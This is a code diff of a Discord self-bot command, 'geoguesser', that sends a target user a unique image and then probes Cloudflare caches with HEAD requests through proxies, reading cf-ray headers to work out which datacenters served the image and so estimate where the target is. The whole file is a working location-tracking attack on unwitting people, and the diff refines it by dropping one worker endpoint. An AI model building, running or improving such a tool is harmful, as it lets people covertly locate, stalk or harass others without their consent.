@@ -1,8 +1,8 @@
 """
 geoguesser.py – !geoguesser <@user>
 Generates a unique random image, sends it to a target user,
-then uses Cloudflare cache enumeration from the ORD worker
-AND internal proxy scanner (HEAD requests) to estimate location.
+then uses Cloudflare cache enumeration via proxy scanner
+(HEAD requests, no pre‑caching) to estimate location.
 Shows a live progress bar with animated spinner.
 Works with user accounts (no embeds).
 """
@@ -19,7 +19,6 @@ import math
 import traceback
 
 # ============ CONFIGURATION ============
-WORKER_ORD = "https://shiny-lab-d8d2.zkutchinsky4413.workers.dev"
 WAIT_SECONDS = 25
 # =======================================
 
@@ -118,7 +117,7 @@ async def scan_via_proxies(image_url):
             try:
                 proxy_url = f"http://{proxy}"
                 async with aiohttp.ClientSession() as session:
-                    # --- THIS IS THE KEY CHANGE: HEAD instead of GET ---
+                    # HEAD request – does not download the body, does not create cache entry
                     async with session.head(image_url, proxy=proxy_url,
                                             timeout=aiohttp.ClientTimeout(total=10)) as resp:
                         cf_ray = resp.headers.get('cf-ray', '')
@@ -176,7 +175,7 @@ async def run(client, message, args):
         "Upload to Discord CDN",
         "Send image to target",
         f"Wait {WAIT_SECONDS}s for target to load image",
-        "Enumerate cache (ORD + proxies)"
+        "Enumerate cache (HEAD requests via proxies)"
     ]
 
     async def _update_progress(step=None, extra=None, spinner_char=None):
@@ -261,40 +260,17 @@ async def run(client, message, args):
             wait_remaining -= 1
         await _update_progress(4, extra=["✅ Wait complete. Scanning caches..."], spinner_char="o")
 
-        # Step 5: Enumerate cache
-        api_ord = f"{WORKER_ORD}?url={image_url}"
-
-        async def fetch_ord():
-            try:
-                async with aiohttp.ClientSession() as session:
-                    async with session.get(api_ord, timeout=35) as resp:
-                        if resp.status == 200:
-                            return await resp.json()
-            except Exception:
-                return None
-
-        data_ord, data_proxy = await asyncio.gather(
-            fetch_ord(),
-            scan_via_proxies(image_url)
-        )
+        # Step 5: Enumerate cache using only proxy scanner (HEAD requests)
+        data = await scan_via_proxies(image_url)
         await _update_progress(4, extra=["🔍 Cache scan complete."])
 
-        # Merge results
-        datacenters = []
-        hits = 0
-        checked = 0
-        full_results = []
-        for data in [data_ord, data_proxy]:
-            if data:
-                dcs = data.get('datacenters', [])
-                for dc in dcs:
-                    if dc not in datacenters:
-                        datacenters.append(dc)
-                hits += data.get('hits', 0)
-                checked += data.get('checked', 0)
-                full_results.extend(data.get('full_results', []))
+        # Extract results
+        datacenters = data.get('datacenters', [])
+        hits = data.get('hits', 0)
+        checked = data.get('checked', 0)
+        full_results = data.get('full_results', [])
 
-        raw_json = json.dumps({"datacenters": datacenters, "full_results": full_results}, indent=2)
+        raw_json = json.dumps(data, indent=2)
         if len(raw_json) > 1000:
             raw_json = raw_json[:1000] + "\n... (truncated)"
 
@@ -303,7 +279,7 @@ async def run(client, message, args):
         lines.append("**📍 GeoGuesser – Location Estimate**")
         lines.append(f"**Target:** {target.name}")
         lines.append(f"**Image URL:** {image_url}")
-        lines.append("**Sources:** ORD worker + proxy scanner (HEAD)")
+        lines.append("**Method:** HEAD requests via proxies (no pre‑caching)")
         lines.append(f"**Datacenters with HIT:** {len(datacenters)}")
         if not datacenters:
             lines.append("**Estimated radius:** N/A (no cache hits)")
@@ -342,7 +318,7 @@ async def run(client, message, args):
             colos_text += f"\n... and {len(probed_colos)-12} more"
         lines.append(f"**🔬 Scanned Colos:**")
         lines.append(f"```\n{colos_text}\n```")
-        lines.append(f"**📄 Raw Merged Data:**")
+        lines.append(f"**📄 Raw Data:**")
         lines.append(f"```json\n{raw_json}\n```")
 
         final_text = "\n".join(lines)
